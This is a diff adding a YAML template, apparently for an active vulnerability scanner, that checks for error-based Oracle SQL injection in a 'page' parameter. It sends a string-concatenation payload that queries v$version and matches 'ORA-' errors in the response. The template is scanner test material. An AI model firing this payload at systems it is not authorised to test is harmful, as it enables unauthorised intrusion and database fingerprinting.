@@ -1,0 +1,22 @@
+id: patt-sqli-ora-err-01-page
+name: 'PATT sqli patt-sqli-ora-err-01 via page'
+severity: high
+type: active
+tags:
+  - sqli
+  - patt
+requires:
+  - java
+description: 'PATT Oracle string-concat error. [patt:patt-sqli-ora-err-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/OracleSQL%20Injection.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - ''' || (SELECT banner FROM v$version) || '''
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'ORA-'
+          - 'Oracle error'
